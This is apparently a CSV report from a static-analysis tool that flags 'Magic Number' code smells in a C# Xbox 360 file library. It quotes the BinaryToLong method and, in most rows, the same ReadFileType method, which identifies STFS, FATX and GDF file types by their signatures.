Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,BinaryToLong,The following statement contains a magic number: try {  	return Convert.ToInt64 (xInput' 2);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,BinaryToLong,The following statement contains a magic number: return Convert.ToInt64 (xInput' 2);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
